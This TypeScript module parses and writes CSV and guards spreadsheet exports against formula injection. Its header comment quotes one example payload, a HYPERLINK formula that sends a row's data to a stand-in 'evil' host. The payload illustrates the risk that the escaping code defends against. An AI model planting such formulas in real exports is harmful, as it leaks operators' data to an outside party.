/**
 * CSV, both directions (C-91).
 *
 * ## Why this is hand-written rather than a dependency
 *
 * The two things that make CSV libraries worth having — dialect sniffing and
 * streaming — are things this codebase does not want. Imports are bounded and
 * read into memory on purpose (see `lib/import/limits.ts`), and a sniffed
 * dialect is a silent, per-file behaviour change on a path that writes content.
 * RFC 4180 with the three real-world deviations below is a hundred lines, and
 * they are lines whose behaviour is written down.
 *
 * ## The deviations, stated
 *
 *  - **CRLF and LF both end a row.** Every spreadsheet on Windows writes the
 *    first and every export from a script writes the second.
 *  - **A leading BOM is consumed.** Excel writes one on "CSV UTF-8", and a BOM
 *    left in place makes the first column header `﻿title`, which then
 *    matches no field and silently drops that column.
 *  - **A short row is padded, a long row is truncated.** A row with fewer cells
 *    than headers is overwhelmingly a trailing empty column, not a corrupt
 *    file; failing the whole import for it helps nobody.
 *
 * ## CSV injection is a real risk on the EXPORT side
 *
 * A cell beginning `=`, `+`, `-`, `@`, tab or CR is a formula to Excel, Sheets
 * and LibreOffice. `=HYPERLINK("http://evil/"&A1,"Click")` in a post title
 * exfiltrates the row when an operator opens their own export. Cells like that
 * are prefixed with a single quote on write — which the spreadsheet strips on
 * display, so the operator sees their text and the formula never runs.
 *
 * The same prefix is REMOVED on read, so an export/import round trip is lossless.
 */

/** Cells starting with one of these are formulas to a spreadsheet. */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * Parse a CSV document into rows of cells.
 *
 * Character by character rather than by regex, because a quoted field may
 * contain commas, newlines and escaped quotes, and no regex that handles all
 * three is one anybody can check.
 */
export function parseCsvRows(text: string): string[][] {
  let src = String(text ?? '');
  if (src.charCodeAt(0) === 0xfeff) src = src.slice(1);
  if (!src) return [];

  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  let i = 0;

  const endCell = () => { row.push(cell); cell = ''; };
  const endRow = () => { endCell(); rows.push(row); row = []; };

  while (i < src.length) {
    const c = src[i];

    if (quoted) {
      if (c === '"') {
        // A doubled quote is a literal quote; a single one closes the field.
        if (src[i + 1] === '"') { cell += '"'; i += 2; continue; }
        quoted = false; i += 1; continue;
      }
      cell += c; i += 1; continue;
    }

    if (c === '"' && cell === '') { quoted = true; i += 1; continue; }
    if (c === ',') { endCell(); i += 1; continue; }
    if (c === '\r') { if (src[i + 1] === '\n') i += 1; endRow(); i += 1; continue; }
    if (c === '\n') { endRow(); i += 1; continue; }
    cell += c; i += 1;
  }

  // A file that does not end in a newline still has a last row. A file that
  // DOES must not gain an empty one.
  if (cell !== '' || row.length > 0) endRow();
  return rows;
}

export interface CsvTable {
  headers: string[];
  /** One object per data row, keyed by header. */
  rows: Record<string, string>[];
}

/**
 * Parse to objects keyed by the header row.
 *
 * Headers are trimmed and lower-cased: a spreadsheet round trip capitalises
 * them often enough that matching case-sensitively would reject a file the
 * operator exported from this same install five minutes earlier.
 */
export function parseCsv(text: string): CsvTable {
  const raw = parseCsvRows(text).filter((r) => r.some((c) => c.trim() !== ''));
  if (!raw.length) return { headers: [], rows: [] };

  const headers = raw[0].map((h) => unescapeFormula(h).trim().toLowerCase());
  const rows = raw.slice(1).map((cells) => {
    const obj: Record<string, string> = {};
    headers.forEach((h, idx) => { obj[h] = unescapeFormula(cells[idx] ?? ''); });
    return obj;
  });
  return { headers, rows };
}

/**
 * Undo the export-side formula guard.
 *
 * The two are not perfect inverses and cannot be: a cell whose real content is
 * `'=1` exports unchanged (it does not START with a formula character, so no
 * prefix is added) and would then re-import as `=1` — the leading quote of the
 * operator's own text silently eaten.
 *
 * So the guard is only removed when it is a guard we could have written: a
 * single leading quote followed by a formula character AND nothing that looks
 * like a second one. A value the writer would not have prefixed is left exactly
 * as it is.
 */
export function unescapeFormula(cell: string): string {
  const s = String(cell ?? '');
  if (!s.startsWith("'")) return s;
  const rest = s.slice(1);
  // `''=1` came in as a literal `'=1`, which the writer WOULD have prefixed.
  // One quote is stripped; the second is the operator's.
  if (rest.startsWith("'")) return rest;
  return FORMULA_START.test(rest) ? rest : s;
}

/** Quote a cell for output, and defuse it if a spreadsheet would run it. */
export function escapeCsvCell(value: unknown): string {
  let s = value === null || value === undefined ? '' : String(value);
  if (FORMULA_START.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Serialise rows to a CSV document.
 *
 * CRLF line endings, per RFC 4180 — Excel is the overwhelmingly common
 * destination and it is the ending it writes itself.
 */
export function toCsv(columns: readonly string[], rows: readonly Record<string, unknown>[]): string {
  const lines = [columns.map(escapeCsvCell).join(',')];
  for (const row of rows) lines.push(columns.map((c) => escapeCsvCell(row[c])).join(','));
  return lines.join('\r\n') + '\r\n';
}
